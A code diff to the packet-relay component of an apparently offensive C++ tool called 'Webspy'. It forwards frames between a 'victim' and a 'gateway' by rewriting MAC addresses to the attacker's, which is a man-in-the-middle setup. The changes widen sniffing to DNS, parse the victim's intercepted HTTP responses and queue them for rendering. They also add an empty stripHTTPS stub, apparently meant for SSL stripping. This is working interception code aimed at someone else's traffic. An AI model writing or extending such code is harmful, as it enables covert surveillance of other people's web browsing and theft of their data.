@@ -13,14 +13,16 @@ pthread_mutex_t 	Pipe::victimMutex;
 pthread_mutex_t 	Pipe::gatewayMutex;
 Crafter				Pipe::victimCrafter;
 Crafter				Pipe::gatewayCrafter;
+Renderer*			Pipe::renderer;
 
-Pipe::Pipe(){}
+Pipe::Pipe() : snifferThread(0), victimThread(0), gatewayThread(0){}
 
 Pipe::~Pipe(){}
 
-void Pipe::init(){
+void Pipe::init(Renderer* rendererPtr){
 	victimCrafter.init(Globals::iface);
 	gatewayCrafter.init(Globals::iface);
+	renderer = rendererPtr;
 
 	if(pthread_mutex_init(&victimMutex, NULL) < 0){
 		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
@@ -47,7 +49,7 @@ void Pipe::init(){
 }
 
 void* Pipe::connect(void* args){
-	char filter[] = "tcp port 80";
+	char filter[] = "tcp port 80 || tcp port 53 || udp port 53";
 	Sniffer sniffer(filter);
 
 	sniffer.listen(relay);
@@ -67,15 +69,20 @@ void Pipe::relay(u_char* args, const struct pcap_pkthdr* header, const unsigned 
 			victimBuffer.push(*rcvdPacket);
 			pthread_mutex_unlock(&victimMutex);
 
+		// Adding packets to the gateway queue (send them to the victim)
 		} else if(!memcmp(ether->shaddr, Globals::gateway.mac->ether_addr_octet, 6)){
-			pthread_mutex_lock(&gatewayMutex);
-			gatewayBuffer.push(*rcvdPacket);
-			pthread_mutex_unlock(&gatewayMutex);
+			if(rcvdPacket->len <= 1514){
+				pthread_mutex_lock(&gatewayMutex);
+				gatewayBuffer.push(*rcvdPacket);
+				pthread_mutex_unlock(&gatewayMutex);
+			}
 
-			if(!isHTTPData(*rcvdPacket)){
-				pthread_mutex_lock(&renderMutex);
-
-				pthread_mutex_unlock(&renderMutex);
+			if(rcvdPacket->isHTTP()){
+				printf("[HTTP] Len: %d\n", rcvdPacket->len);
+				HTTP* httpData = new HTTP((unsigned char*)rcvdPacket->getPayload());
+				pthread_mutex_lock(&renderer->rendererMutex);
+				renderer->rendererBuffer.push(*httpData);
+				pthread_mutex_unlock(&renderer->rendererMutex);
 			}
 		}
 	}
@@ -93,7 +100,7 @@ void* Pipe::routeToVictim(void* args){
 			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
 			memcpy(ether->thaddr, Globals::victim.mac->ether_addr_octet, 6);
 
-			printf("Packet: %d bytes    attacker  ->  victim\n", packet.len);
+			//printf("[packet] attacker -> victim  | Len: %d\n", packet.len);
 			gatewayCrafter.sendRaw(packet);
 		}
 	}
@@ -111,9 +118,12 @@ void* Pipe::routeToGateway(void* args){
 			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
 			memcpy(ether->thaddr, Globals::gateway.mac->ether_addr_octet, 6);
 
-			printf("Packet: %d bytes    attacker  ->  gateway\n", packet.len);
+			//printf("[packet] attacker -> gateway | Len: %d\n", packet.len);
 			victimCrafter.sendRaw(packet);
 		}
 	}
 }
 
+void Pipe::stripHTTPS(){
+
+}
